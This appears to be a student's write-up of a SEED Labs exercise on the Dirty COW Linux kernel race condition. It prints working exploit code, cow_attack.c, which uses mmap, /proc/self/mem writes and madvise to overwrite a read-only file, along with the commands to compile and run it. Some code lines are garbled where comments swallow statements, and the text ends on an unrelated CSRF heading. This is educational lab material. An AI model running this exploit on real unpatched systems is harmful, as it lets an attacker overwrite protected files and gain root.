
# SEEDlabs: Dirty COW Attack Lab

#### Ozgur Ural
#### Student ID: 2564455

## 1 Lab Overview

The Dirty COW vulnerability is an interesting case of the race condition vulnerability. It existed in the  Linux  kernel  since  September  2007,  and  was  discovered  and  exploited  in  October  2016. The vulnerability affects all Linux-based operating systems, including Android, and its consequence is very severe: attackers can gain the root privilege by exploiting the vulnerability. The  vulnerability  resides  in  the  code  of  copy-on-write  inside  Linux  kernel.  By  exploiting  this vulnerability, attackers can modify any protected file, even though these files are only readable to them.

The objective of this lab is for you to gain the hands-on experience on the Dirty COW attack, understand the race condition vulnerability exploited by the attack, and gain a deeper understanding  of  the  general race condition security  problems.  In  this  lab, you will  exploit the Dirty COW race condition vulnerability to gain the root privilege. Note:  This  lab  is  based  on  the  Ubuntu12.04  VM.  If  you  are  currently  using  a  newer  Linux version,  such  as  Ubuntu16.04,  the  vulnerability  has  already  been  patched.  Therefore, to complete this lab please use the Ubuntu 12.04 VM.

## 2 Task 1: Modify a Dummy Read-Only File
The objective of this task is to write to a read-only file using the Dirty COW vulnerability.

## 2.1 Create a Dummy File
We first need to select a target file. Although this file can be any read-only file in the system, we will use a dummy file in this task, so we do not corrupt an important system file in case we make a mistake. Please create a file called zzz in the root directory using the root account, change its permission  to  read-only for normal users, and put some random content into the file using an editor such as gedit.

```sh
$ sudo touch /zzz
$ sudo chmod 644 /zzz
$ sudo gedit /zzz
$ cat /zzz 111111222222333333
$ ls -l /zzz
$ -rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz
$ echo 99999 > /zzz
$ bash: /zzz: (*@Permission denied@*)
```

From the above experiment, we can see that if we try to write to this file as a normal user, we will fail, because the file is only readable to normal users. However, because of the Dirty COW vulnerability in the system, we can find a way to write to this file. Our objective is to replace the pattern "222222" with "******".

## 2.2 Set Up the Memory Mapping Thread

You  check  the  program  cow  attack.c  for  this  lab.  The  program  has  three  threads:  the  main 
thread, the write thread, and the madvise thread. The main thread maps /zzz to memory, finds 
where  the  pattern  "222222"  is,  and  then  creates  two  threads  to  exploit  the  Dirty  COW  race 
condition vulnerability in the OS kernel.

```sh
/* cow_attack.c (the main thread) */
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#define OFFSET 5
#define TARGET_CONTENT " I have successfully Attacked!! "
void *map;
int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  // Open the file in read only mode. int 
  f=open("/zzz", O_RDONLY);
  // Open with PROT_READ.
  fstat(f, &st);
  map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, NULL); (*@Line 1@*)
  pthread_create(&pth2, NULL, writeThread, TARGET_CONTENT); (*@Line 2@*)
  // Wait for the threads to finish. 
  pthread_join(pth1, NULL); 
  pthread_join(pth2, NULL);
  return 0;
}
```
In the above code, we start two threads: madviseThread (Line À) and writeThread (Line `)

## 2.3 Set Up the write Thread

The job of the write thread listed in the following is to replace the string "222222" in the memory 
with  "******".  Since  the  mapped  memory  is  of  COW  type,  this  thread  alone  will  only  be  able  to 
modify the contents in a copy of the mapped memory, which will not cause any change to the 
underlying /zzz file.

```sh
/* cow_attack.c (the write thread) */
void * writeThread(void *arg)
{
  char *content= (char*) arg;
  char current_content[10];
  int f=open("/proc/self/mem", O_RDWR); while(1) 
  {
    //Set the file pointer to the OFFSET from the beginning lseek(f, (uintptr_t) 
    map + OFFSET, SEEK_SET); write(f, content, strlen(content));
  }
}
```

## 2.4 The madvise Thread

The madvise thread does only one thing: discarding the private copy of the mapped memory, so 
the page table can point back to the original mapped memory.

```sh
/* cow_attack.c (the madvise thread) */
void *madviseThread(void *arg)
{
  while(1){
    madvise(map, 100, MADV_DONTNEED);
  }
}
```

## 2.5 Launch the Attack

If the write() and the madvise() system calls are invoked alternatively, i.e., one is invoked only 
after the other is finished, the write operation will always be performed on the private copy, and 
we  will  never  be  able  to  modify  the  target  file.  The  only  way  for  the  attack  to  succeed  is  to 
perform the madvise() system call while the write() system call is still running. We cannot always 
achieve that, so we need to try many times. As long as the probability is not extremely low, we 
have  a  chance.  That  is  why  in  the  threads,  we  run  the  two  system  calls  in  an  infinite  loop. 
Compile the cow attack.c and run it for a few seconds. If your attack is successful, you should 
be able to see a modified /zzz file. Report your results in the lab report and explain how you are 
able to achieve that.

```sh
$ gcc cow_attack.c -lpthread
$ a.out
... press Ctrl-C after a few seconds ...
```




## 3 Background of CSRF Attacks



